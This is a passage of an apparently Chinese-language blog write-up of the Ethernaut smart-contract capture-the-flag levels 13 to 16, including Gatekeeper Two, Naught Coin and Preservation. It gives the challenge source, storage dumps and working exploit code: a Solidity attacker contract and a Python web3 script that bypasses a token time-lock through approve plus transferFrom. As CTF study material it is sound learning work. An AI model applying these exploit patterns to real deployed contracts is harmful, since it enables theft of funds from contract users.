class="number">81910</span>&#125;(abi.encodeWithSignature(<span class="string">"enter(bytes8)"</span>, bytes8(bts)));</span><br><span class="line">        <span class="built_in">require</span>(res == <span class="literal">true</span>, <span class="string">"enter(): Attack Fail."</span>);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>254是用remix调试出来的。</p>
<h1 id="Level-14-Gatekeeper-Two"><a href="#Level-14-Gatekeeper-Two" class="headerlink" title="Level 14. Gatekeeper Two"></a>Level 14. Gatekeeper Two</h1><h2 id="Source-8"><a href="#Source-8" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(</span><br><span class="line">		uint64(</span><br><span class="line">			bytes8(</span><br><span class="line">				keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">				)</span><br><span class="line">			) ^ uint64(_gateKey) </span><br><span class="line">		== </span><br><span class="line">		uint64(<span class="number">0</span>) - <span class="number">1</span></span><br><span class="line">	);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析，需要在constructor中完成利用。</p>
<p>值得留意的事情：代码里<code>uint64(0) - 1</code>在0.8.0版本的编译器里会直接revert，好高级。自动溢出保护。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    </span><br><span class="line">    address target = <span class="number">0xe7bdbFDaf1cddF5F16c81cB02FD49E57952E92FC</span>;</span><br><span class="line">    <span class="comment">// bytes public B;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="comment">// address x = address(new GatekeeperTwo());</span></span><br><span class="line">        uint64 bts = uint64(bytes8(keccak256(abi.encodePacked(<span class="keyword">this</span>)))) ^ uint64(<span class="number">0xffffffffffffffff</span>);</span><br><span class="line">        <span class="comment">// bts ^= uint64(0xffffffffffffffff);</span></span><br><span class="line">        <span class="comment">// bts ^= uint64(0) - 1;</span></span><br><span class="line">        bool res;</span><br><span class="line">        <span class="comment">// target = x;</span></span><br><span class="line">        bytes memory ret;</span><br><span class="line">        (res, ret) = target.call(abi.encodeWithSignature(<span class="string">"enter(bytes8)"</span>, bytes8(bts)));</span><br><span class="line">        <span class="comment">// B = ret;</span></span><br><span class="line">        <span class="built_in">require</span>(res == <span class="literal">true</span>, <span class="string">"enter(): Attack Fail."</span>);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span>(<span class="params">uint64</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// return uint64(0) - 1; // this will revert !!!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin, <span class="string">"gate 1"</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>, <span class="string">"gate 2"</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(</span><br><span class="line">		uint64(</span><br><span class="line">			bytes8(</span><br><span class="line">				keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">				)</span><br><span class="line">			) ^ uint64(_gateKey) </span><br><span class="line">		== </span><br><span class="line">		<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span></span><br><span class="line"><span class="comment">// 		uint64(0) - 1, "gate 3"</span></span><br><span class="line">	);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes8</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> bytes8(uint64(</span><br><span class="line">			bytes8(</span><br><span class="line">				keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">				)</span><br><span class="line">			) ^ uint64(_gateKey) );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-15-Naught-Coin"><a href="#Level-15-Naught-Coin" class="headerlink" title="Level 15. Naught Coin"></a>Level 15. Naught Coin</h1><h2 id="Source-9"><a href="#Source-9" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/token/ERC20/ERC20.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = 'NaughtCoin';</span></span><br><span class="line">  <span class="comment">// string public constant symbol = '0x0';</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _player) </span><br><span class="line">  ERC20('NaughtCoin', '0x0')</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span>**uint256(decimals()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(<span class="number">0</span>), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">override</span> <span class="title">public</span> <span class="title">lockTokens</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">In [3]: target = &apos;0x153cD5C206630Dbd726891f2aE5e6CF031460cfE&apos;</span><br><span class="line"></span><br><span class="line">In [4]: w3.eth.get_storage_at(target,0)</span><br><span class="line">Out[4]: HexBytes(&apos;0x0000000000000000000000000000000000000000000000000000000000000000&apos;)</span><br><span class="line"></span><br><span class="line">In [5]: w3.eth.get_storage_at(target,1)</span><br><span class="line">Out[5]: HexBytes(&apos;0x0000000000000000000000000000000000000000000000000000000000000000&apos;)</span><br><span class="line"></span><br><span class="line">In [6]: w3.eth.get_storage_at(target,2)</span><br><span class="line">Out[6]: HexBytes(&apos;0x00000000000000000000000000000000000000000000d3c21bcecceda1000000&apos;)</span><br><span class="line"></span><br><span class="line">In [7]: w3.eth.get_storage_at(target,3)</span><br><span class="line">Out[7]: HexBytes(&apos;0x4e6175676874436f696e00000000000000000000000000000000000000000014&apos;)</span><br><span class="line"></span><br><span class="line">In [8]: w3.eth.get_storage_at(target,4)</span><br><span class="line">Out[8]: HexBytes(&apos;0x3078300000000000000000000000000000000000000000000000000000000006&apos;)</span><br><span class="line"></span><br><span class="line">In [9]: w3.eth.get_storage_at(target,5)</span><br><span class="line">Out[9]: HexBytes(&apos;0x0000000000000000000000000000000000000000000000000000000000000012&apos;)</span><br><span class="line"></span><br><span class="line">In [10]: w3.eth.get_storage_at(target,6)</span><br><span class="line">Out[10]: HexBytes(&apos;0x00000000000000000000000000000000000000000000000000000000735d4e82&apos;)</span><br><span class="line"></span><br><span class="line">In [11]: w3.eth.get_storage_at(target,7)</span><br><span class="line">Out[11]: HexBytes(&apos;0x00000000000000000000000000000000000000000000d3c21bcecceda1000000&apos;)</span><br><span class="line"></span><br><span class="line">In [12]: w3.eth.get_storage_at(target,8)</span><br><span class="line">Out[12]: HexBytes(&apos;0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f&apos;)</span><br><span class="line"></span><br><span class="line">In [13]: bytes.fromhex(&apos;4e6175676874436f696e&apos;)</span><br><span class="line">Out[13]: b&apos;NaughtCoin&apos;</span><br><span class="line"></span><br><span class="line">In [14]: 0x14/2</span><br><span class="line">Out[14]: 10.0</span><br><span class="line"></span><br><span class="line">In [15]: bytes.fromhex(&apos;307830&apos;)</span><br><span class="line">Out[15]: b&apos;0x0&apos;</span><br><span class="line"></span><br><span class="line">In [16]: w3.eth.get_storage_at(target,9)</span><br><span class="line">Out[16]: HexBytes(&apos;0x0000000000000000000000000000000000000000000000000000000000000000&apos;)</span><br><span class="line"></span><br><span class="line">In [18]: 1000000 * (10**18)</span><br><span class="line">Out[18]: 1000000000000000000000000</span><br><span class="line"></span><br><span class="line">In [19]: hex(_)</span><br><span class="line">Out[19]: &apos;0xd3c21bcecceda1000000&apos;</span><br></pre></td></tr></table></figure>
<p>合约一开头是继承的父合约ERC20的结构体变量，发现lockTokens这个修饰器对时间有要求。</p>
<p>但是ERC20可以转账的函数显然不止transfer一个函数。可以使用<code>approve+transferFrom</code>进行转账。</p>
<p>有地方需要注意的是，ERC20不允许向0地址转账…..</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params">address sender, address recipient, uint256 amount</span>) <span class="title">internal</span> <span class="title">virtual</span> </span>&#123;</span><br><span class="line">       <span class="built_in">require</span>(sender != address(<span class="number">0</span>), <span class="string">"ERC20: transfer from the zero address"</span>);</span><br><span class="line">       <span class="built_in">require</span>(recipient != address(<span class="number">0</span>), <span class="string">"ERC20: transfer to the zero address"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3.auto.infura.rinkeby <span class="keyword">import</span> w3</span><br><span class="line"><span class="keyword">from</span> eth_abi <span class="keyword">import</span> encode_abi</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> w3.isConnected()</span><br><span class="line"></span><br><span class="line">private = <span class="string">' -^=^- '</span></span><br><span class="line">public = <span class="string">'0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F'</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">'0x153cD5C206630Dbd726891f2aE5e6CF031460cfE'</span></span><br><span class="line"></span><br><span class="line">hacker_private = <span class="string">' -^=^- '</span></span><br><span class="line">hacker = <span class="string">'0x3465CBfee24B4b369304D3B0471851665034a303'</span></span><br><span class="line"></span><br><span class="line">empty = <span class="string">'0x0000000000000000000000000000000000000001'</span></span><br><span class="line"></span><br><span class="line">calldata = bytes(w3.keccak(<span class="string">b'approve(address,uint256)'</span>)[:<span class="number">4</span>])</span><br><span class="line">calldata += encode_abi([<span class="string">'address'</span>, <span class="string">'uint256'</span>], [hacker, <span class="number">1000000</span> * (<span class="number">10</span> ** <span class="number">18</span>)])</span><br><span class="line"></span><br><span class="line">txn = &#123;</span><br><span class="line">	<span class="string">"from"</span>: public,</span><br><span class="line">	<span class="string">"to"</span>: target,</span><br><span class="line">	<span class="string">"gasPrice"</span>: w3.toWei(<span class="number">1</span>, <span class="string">'gwei'</span>),</span><br><span class="line">	<span class="string">"gas"</span>: <span class="number">0x32185</span>,</span><br><span class="line">	<span class="string">"value"</span>: w3.toWei(<span class="number">0</span>, <span class="string">'wei'</span>),</span><br><span class="line">	<span class="string">"nonce"</span>: w3.eth.getTransactionCount(public),</span><br><span class="line">	<span class="string">"data"</span>: calldata</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(txn, private)</span><br><span class="line">txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()</span><br><span class="line">print(txn_hash)</span><br><span class="line">txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class="line">print(txn_receipt)</span><br><span class="line"></span><br><span class="line">calldata = bytes(w3.keccak(<span class="string">b'transferFrom(address,address,uint256)'</span>)[:<span class="number">4</span>])</span><br><span class="line">calldata += encode_abi([<span class="string">'address'</span>, <span class="string">'address'</span>, <span class="string">'uint256'</span>], [public, empty, <span class="number">1000000</span> * (<span class="number">10</span> ** <span class="number">18</span>)])</span><br><span class="line"></span><br><span class="line">txn = &#123;</span><br><span class="line">	<span class="string">"from"</span>: hacker,</span><br><span class="line">	<span class="string">"to"</span>: target,</span><br><span class="line">	<span class="string">"gasPrice"</span>: w3.toWei(<span class="number">1</span>, <span class="string">'gwei'</span>),</span><br><span class="line">	<span class="string">"gas"</span>: <span class="number">0x32185</span>,</span><br><span class="line">	<span class="string">"value"</span>: w3.toWei(<span class="number">0</span>, <span class="string">'wei'</span>),</span><br><span class="line">	<span class="string">"nonce"</span>: w3.eth.getTransactionCount(hacker),</span><br><span class="line">	<span class="string">"data"</span>: calldata</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(txn, hacker_private)</span><br><span class="line">txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()</span><br><span class="line">txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class="line"><span class="keyword">assert</span> txn_receipt[<span class="string">'status'</span>] == <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] OK '</span> + str(txn_receipt[<span class="string">'transactionIndex'</span>]) + <span class="string">' @ '</span> + txn_receipt[<span class="string">'transactionHash'</span>].hex())</span><br></pre></td></tr></table></figure>
<h1 id="Level-16-Preservation"><a href="#Level-16-Preservation" class="headerlink" title="Level 16. Preservation"></a>Level 16. Preservation</h1><blockquote>
<p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim <strong>ownership</strong> of the instance you are given.</p>
</blockquote>
<h2 id="Source-10"><a href="#Source-10" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;  <span class="comment">// 0</span></span><br><span class="line">  address public timeZone2Library;  <span class="comment">// 1</span></span><br><span class="line">  address public owner;             <span class="comment">// 2</span></span><br><span class="line">  uint storedTime;                  <span class="comment">// 3</span></span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>delegatecall调用外部函数storage位置没有对上，造成任意指定storage篡改</p>
<p>target contract : <code>0x4464A38441e76713439883883752A60B02C24298</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: target = <span class="string">'0x4464A38441e76713439883883752A60B02C24298'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: w3.eth.get_storage_at(target,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">32</span>]: HexBytes(<span class="string">'0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: w3.eth.get_storage_at(target,<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">33</span>]: HexBytes(<span class="string">'0x000000000000000000000000ea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1'</span>)</span><br></pre></td></tr></table></figure>
<p>从反编译的结果来看library code就如源码中所示的那么简单，修改<code>stoarge 0</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x80</span>;</span><br><span class="line">        <span class="keyword">var</span> var0 = msg.value;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (var0) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (msg.data.length &lt; <span class="number">0x04</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    </span><br><span class="line">        var0 = msg.data[<span class="number">0x00</span>:<span class="number">0x20</span>] &gt;&gt; <span class="number">0xe0</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (var0 != <span class="number">0x3beb26c4</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> var1 = <span class="number">0x56</span>;</span><br><span class="line">        <span class="keyword">var</span> var2 = <span class="number">0x04</span>;</span><br><span class="line">        <span class="keyword">var</span> var3 = msg.data.length - var2;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (var3 &lt; <span class="number">0x20</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); 